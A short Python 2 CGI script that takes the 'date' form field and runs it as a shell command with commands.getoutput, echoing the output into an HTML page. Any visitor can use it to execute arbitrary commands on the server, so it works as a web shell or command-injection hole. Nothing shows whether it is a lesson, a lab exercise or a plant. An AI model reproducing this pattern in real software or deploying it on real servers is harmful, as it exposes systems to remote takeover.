#!/usr/bin/python

import commands
import cgi

print "Content-Type : text/html"
print ""

data=cgi.FieldStorage()

command=data.getvalue('date')

print "<pre>"
print commands.getoutput(command)
print "</pre>"
